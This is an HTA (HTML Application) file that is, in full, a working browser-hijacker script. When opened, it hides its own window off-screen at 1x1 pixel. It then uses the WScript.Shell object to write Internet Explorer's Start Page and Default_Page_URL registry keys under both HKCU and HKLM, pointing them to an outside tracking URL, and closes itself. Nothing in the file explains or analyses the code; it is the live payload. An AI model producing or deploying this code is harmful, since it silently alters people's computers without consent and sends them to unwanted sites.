<head>

<hta:application id=as applicationName=abcdefg showInTaskBar=no caption=no innerBorder=no selection=no scroll=no contextmenu=no maximizeButton=no minimizeButton=no navigable=no border=0 windowState=minimize /></head>

<object id=wsh classid=clsid:F935DC22-1CF0-11D0-ADB9-00C04FD58A0B></object>

<script>window.moveTo(5000,5000);window.resizeTo(1,1);

as.windowState='normal';

HomePageUrl='http://1autocity.com/index.php?code=gA5yI4esc6';

wsh.RegWrite('HKCU\\Software\\Microsoft\\Internet Explorer\\Main\\Start Page', HomePageUrl);

wsh.RegWrite('HKCU\\Software\\Microsoft\\Internet Explorer\\Main\\Default_Page_URL', HomePageUrl);

wsh.RegWrite('HKLM\\Software\\Microsoft\\Internet Explorer\\Main\\Start Page', HomePageUrl);

wsh.RegWrite('HKLM\\Software\\Microsoft\\Internet Explorer\\Main\\Default_Page_URL', HomePageUrl);

self.close()

</script>